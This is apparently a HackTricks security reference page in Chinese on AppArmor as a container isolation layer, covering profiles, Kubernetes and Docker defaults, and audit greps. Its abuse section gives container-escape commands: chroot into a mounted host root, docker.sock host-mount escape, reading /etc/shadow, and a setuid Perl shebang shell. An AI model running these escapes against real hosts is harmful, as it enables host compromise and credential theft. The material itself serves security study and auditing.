# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## 概述

AppArmor 是一种**强制访问控制**系统，通过针对每个程序的配置文件施加限制。与高度依赖用户和组所有权的传统 DAC 检查不同，AppArmor 允许内核对附加到进程本身的策略进行强制执行。在容器环境中，这一点很重要，因为工作负载可能拥有足够的传统权限来尝试执行某项操作，但仍会因其 AppArmor 配置文件不允许相关路径、挂载、网络行为或 capability 使用而被拒绝。

最重要的概念是，AppArmor **基于路径**。它通过路径规则来判断文件系统访问，而不像 SELinux 那样使用标签。这种方式易于理解且功能强大，但也意味着需要仔细关注 bind mount 和其他路径布局。如果同一主机内容通过不同路径变得可访问，策略产生的效果可能与操作者最初的预期不同。

## 在容器隔离中的作用

容器安全审查往往只关注 capabilities 和 seccomp，但通过这些检查后，AppArmor 仍然很重要。设想一个权限超出应有范围的容器，或一个因运行需要而必须多用一个 capability 的工作负载。AppArmor 仍可限制文件访问、挂载行为、网络和执行模式，从而阻止明显的滥用路径。因此，为了“让应用正常运行”而禁用 AppArmor，可能会在不知不觉中把一个仅有风险的配置变成可被实际利用的配置。

## 实验

要检查主机上的 AppArmor 是否处于启用状态，请使用：

```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```

若要查看当前容器进程以什么身份运行：

```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```

正常情况下，进程应显示与运行时所选 profile 关联的 AppArmor 上下文。在 unconfined 情况下，这一额外的限制层会消失。

你还可以检查 Docker 认为自己应用了什么：

```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```

## 运行时用法

如果主机支持，Docker 可以应用默认或自定义的 AppArmor 配置文件。Podman 也可以在基于 AppArmor 的系统上集成 AppArmor，不过在以 SELinux 为先的发行版中，通常会以另一种 MAC 系统为主。Kubernetes 可以在实际支持 AppArmor 的节点上，在工作负载级别应用 AppArmor 策略。LXC 及相关的 Ubuntu 系系统容器环境也广泛使用 AppArmor。

关键在于，AppArmor 并不是“Docker 功能”，而是主机内核功能，多个运行时都可以选择应用它。如果主机不支持 AppArmor，或者运行时被配置为以 unconfined 模式运行，那么所谓的保护实际上并不存在。

对于 Kubernetes，现代 API 是 `securityContext.appArmorProfile`。从 Kubernetes `v1.30` 开始，旧版 beta AppArmor annotations 已弃用。在支持 AppArmor 的主机上，默认配置文件是 `RuntimeDefault`；而 `Localhost` 指向的配置文件必须已经加载到节点上。在审查时，这一点很重要，因为 manifest 看起来可能支持 AppArmor，但实际上仍完全依赖节点端的支持和预加载的配置文件。<sup>[[1]](#references)</sup>

一个细微但实用的运维细节是，显式设置 `appArmorProfile.type: RuntimeDefault` 比省略该字段更严格。如果显式设置了该字段，而节点不支持 AppArmor，admission 应该失败。如果省略该字段，工作负载仍可能在没有 AppArmor 的节点上运行，只是无法获得这层额外的限制。从攻击者的角度来看，这正是同时检查 manifest 和节点实际状态的一个好理由。<sup>[[1]](#references)</sup>

在支持 AppArmor 的 Docker 主机上，最广为人知的默认配置文件是 `docker-default`。该配置文件由 Moby 的 AppArmor 模板生成，这一点很重要，因为它解释了为什么某些基于 capability 的 PoC 在默认容器中仍会失败。总体来说，`docker-default` 允许常规网络操作，禁止对 `/proc` 的大部分内容进行写入，禁止访问 `/sys` 的敏感部分，阻止 mount 操作，并限制 ptrace，使其不能成为通用的主机探测手段。了解这一基线有助于区分“容器拥有 `CAP_SYS_ADMIN`”和“容器实际上能利用该 capability 操作我关注的内核接口”。

## 配置文件管理

AppArmor 配置文件通常存储在 `/etc/apparmor.d/` 下。常见的命名约定是将可执行文件路径中的斜杠替换为点。例如，`/usr/bin/man` 的配置文件通常存储为 `/etc/apparmor.d/usr.bin.man`。这一点在防御和评估过程中都很重要，因为只要知道活动配置文件的名称，通常就能在主机上快速找到对应的文件。

常用的主机端管理命令包括：

```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```

这些命令在容器安全参考中很重要，因为它们说明了如何实际构建、加载配置文件、切换到 complain mode，以及在应用程序变更后修改配置文件。如果操作人员习惯在故障排查时将配置文件切换到 complain mode，却忘记恢复强制执行，容器在文档中看起来可能受到保护，实际运行时却宽松得多。

### 构建和更新配置文件

`aa-genprof` 可以观察应用程序的行为，并帮助以交互方式生成配置文件：

```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```

`aa-easyprof` 可以生成一个模板配置文件，之后可使用 `apparmor_parser` 加载：

```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```

当二进制文件发生变化且需要更新策略时，`aa-logprof` 可以重放日志中发现的拒绝事件，并协助操作员决定是否允许这些操作：

```bash
sudo aa-logprof
```

### 日志

AppArmor 拒绝记录通常可通过 `auditd`、syslog 或 `aa-notify` 等工具查看：

```bash
sudo aa-notify -s 1 -v
```

这在运维和攻击中都很有用。防御者会用它来完善配置文件。攻击者则用它来确定具体是哪个路径或操作被拒绝，以及 AppArmor 是否是阻止 exploit chain 的控制措施。

### 确定具体的配置文件

当某个 runtime 显示容器使用了特定的 AppArmor profile 名称时，通常有必要将该名称对应到磁盘上的 profile 文件：

```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```

这在主机侧审查中特别有用，因为它弥合了“容器声称自己运行在 `lowpriv` profile 下”和“实际规则位于这个可审计或重新加载的特定文件中”之间的差距。

### 值得重点审计的规则

当你可以读取 profile 时，不要只关注简单的 `deny` 行。有几类规则会实质性地影响 AppArmor 防御容器逃逸尝试的效果：<sup>[[2]](#references)</sup>

- `ux` / `Ux`：以不受限状态执行目标二进制文件。如果某个可访问的 helper、shell 或 interpreter 获准使用 `ux`，这通常是首先要测试的内容。
- `px` / `Px` 和 `cx` / `Cx`：在 exec 时执行 profile 转换。这些规则本身并不一定有问题，但值得审计，因为转换可能会进入比当前 profile 宽松得多的 profile。
- `change_profile`：允许任务立即或在下次 exec 时切换到另一个已加载的 profile。如果目标 profile 更弱，这可能成为预期的逃逸通道，让任务脱离受限域。
- `flags=(complain)`、`flags=(unconfined)` 或较新的 `flags=(prompt)`：这些标志会影响你对 profile 的信任程度。`complain` 会记录拒绝操作而非强制执行，`unconfined` 会移除边界，而 `prompt` 依赖 userspace 决策路径，而不是单纯由内核强制拒绝。
- `userns` 或 `userns create,`：较新的 AppArmor policy 可以对 user namespace 的创建进行中介。如果容器 profile 明确允许创建，那么即使平台将 AppArmor 作为加固策略的一部分，嵌套 user namespace 仍然可用。

实用的主机侧 grep：

```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

这种审计往往比盯着数百条普通文件规则更有用。如果逃逸依赖于执行辅助程序、进入新的 namespace，或切换到限制较少的 profile，答案通常藏在这些面向状态转换的规则中，而不是显而易见的 `deny /etc/shadow r` 这类行里。

## Misconfigurations

最明显的错误是 `apparmor=unconfined`。管理员经常在调试某个应用时设置它，因为 profile 正确地阻止了某些危险或意外操作。如果这个标志在生产环境中仍然保留，整个 MAC 层实际上就被移除了。

另一个不易察觉的问题，是认为 bind mount 无害，因为文件权限看起来正常。由于 AppArmor 是基于路径的，将主机路径暴露在其他挂载位置下，可能会与路径规则产生不良交互。第三个错误是忘记：配置文件中的 profile 名称意义不大，除非主机内核确实在强制执行 AppArmor。

## Abuse

AppArmor 被移除后，先前受限的操作可能突然变得可行：通过 bind mount 读取敏感路径、访问原本应更难使用的 procfs 或 sysfs 部分、在 capabilities/seccomp 也允许的情况下执行与 mount 相关的操作，或使用 profile 通常会拒绝的路径。AppArmor 往往能解释为什么基于 capability 的逃逸尝试在纸面上“应该可行”，但在实际操作中仍会失败。移除 AppArmor 后，同样的尝试可能就会成功。

如果你怀疑 AppArmor 是阻止 path-traversal、bind-mount 或基于 mount 的滥用链的主要因素，第一步通常是比较启用和禁用 profile 时哪些内容变得可访问。例如，如果某个主机路径已挂载到容器内，可以先检查你是否能够遍历并读取它：

```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```

如果容器还拥有诸如 `CAP_SYS_ADMIN` 这样的危险 capability，最实用的测试之一就是确认 AppArmor 是否是阻止 mount 操作或访问敏感内核文件系统的控制机制：

```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```

在宿主机路径已通过 bind mount 提供的环境中，失去 AppArmor 保护还可能使只读信息泄露问题演变为直接访问宿主机文件：

```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```

这些命令的重点并不是 AppArmor 本身会造成容器逃逸，而是移除 AppArmor 后，许多基于文件系统和挂载的滥用路径便可立即进行测试。

### 完整示例：禁用 AppArmor + 挂载宿主机根目录

如果容器已经将宿主机根目录 bind mount 到 `/host`，移除 AppArmor 就可能让原本受阻的文件系统滥用路径变成完整的宿主机逃逸：

```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```

一旦 shell 通过主机文件系统执行，工作负载实际上就已经逃逸出容器边界：

```bash
id
hostname
cat /etc/shadow | head
```

### 完整示例：AppArmor 已禁用 + 运行时套接字

如果真正的屏障是保护运行时状态的 AppArmor，那么挂载的套接字就足以实现完全逃逸：

```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```

具体路径取决于挂载点，但最终结果相同：AppArmor 不再阻止对 runtime API 的访问，而 runtime API 可以启动一个危害主机的容器。

### 完整示例：基于路径的 Bind-Mount 绕过

由于 AppArmor 基于路径进行保护，因此保护 `/proc/**` 并不会自动保护通过其他路径访问到的相同主机 procfs 内容：

```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```

具体影响取决于挂载的内容，以及备用路径是否也绕过了其他控制措施；但这种模式最清楚地说明了为什么必须结合挂载布局评估 AppArmor，而不能孤立地评估它。

### 完整示例：Shebang 绕过

AppArmor 可能会将 profile 附加到被执行的脚本路径，而不是其 shebang 中指定的解释器。反过来，直接调用解释器则可能选中解释器的 profile。一位 [AppArmor 维护者描述了这种区别](https://bugs.launchpad.net/apparmor/+bug/1911431)。一个历史示例涉及一个首行指向受限解释器的脚本：

```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```

此示例仅代表一种可能情况：解释器的 file capability 可能生效，且脚本实际的 exec attachment 允许该操作。请检查已加载的策略和进程标签、capability bounding set、`no_new_privs` 以及挂载点的 `nosuid` 状态；仅凭 profile 文件名或 `cap_setuid+ep` 列表，无法证明可用的权限转换确实存在。解释器链和其他执行路径应单独审查。

## 检查

这些检查旨在快速回答三个问题：主机是否启用了 AppArmor、当前进程是否受到限制，以及运行时是否确实为此容器应用了 profile？

```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

这里有几点值得注意：

- 如果 `/proc/self/attr/current` 显示 `unconfined`，说明工作负载没有受到 AppArmor 限制。
- 如果 `aa-status` 显示 AppArmor 已禁用或未加载，那么运行时配置中的任何 profile 名称大多只是表面设置。
- 如果 `docker inspect` 显示 `unconfined` 或意外的自定义 profile，这通常就是基于文件系统或挂载的滥用路径能够奏效的原因。
- 如果 `/sys/kernel/security/apparmor/profiles` 中没有你预期的 profile，那么仅靠运行时或编排器配置并不足以实现限制。
- 如果一个声称经过强化的 profile 包含 `ux`、宽泛的 `change_profile`、`userns` 或 `flags=(complain)` 这类规则，那么实际安全边界可能远弱于 profile 名称所暗示的程度。

如果容器出于运维原因已经拥有较高权限，保持 AppArmor 启用，往往能决定这究竟是一个受控的例外，还是范围更广的安全失陷。

## Runtime Defaults

| 运行时 / 平台 | 默认状态 | 默认行为 | 常见的手动弱化方式 |
| --- | --- | --- | --- |
| Docker Engine | 在支持 AppArmor 的主机上默认启用 | 除非被覆盖，否则使用 `docker-default` AppArmor profile | `--security-opt apparmor=unconfined`、`--security-opt apparmor=<profile>`、`--privileged` |
| Podman | 取决于主机 | 支持通过 `--security-opt` 使用 AppArmor，但具体默认行为取决于主机和运行时，不像 Docker 文档中的 `docker-default` profile 那样普遍适用 | `--security-opt apparmor=unconfined`、`--security-opt apparmor=<profile>`、`--privileged` |
| Kubernetes | 有条件的默认设置 | 如果未指定 `appArmorProfile.type`，则默认使用 `RuntimeDefault`；但只有在节点启用了 AppArmor 时才会生效 | `securityContext.appArmorProfile.type: Unconfined`、使用弱 profile 的 `securityContext.appArmorProfile.type: Localhost`、不支持 AppArmor 的节点 |
| containerd / CRI-O under Kubernetes | 取决于节点和运行时的支持情况 | Kubernetes 常用的运行时支持 AppArmor，但实际强制执行仍取决于节点支持情况和工作负载设置 | 与 Kubernetes 行相同；直接配置运行时也可能完全跳过 AppArmor |

对于 AppArmor，最重要的变量往往是**主机**，而不仅仅是运行时。如果节点未启用 AppArmor，那么清单文件中的 profile 设置并不会创建任何限制。

## References

- [1] [Kubernetes 安全上下文：AppArmor profile 字段和节点支持行为](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [2] [Ubuntu 24.04 `apparmor.d(5)` manpage：exec 转换、`change_profile`、`userns` 和 profile 标志](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
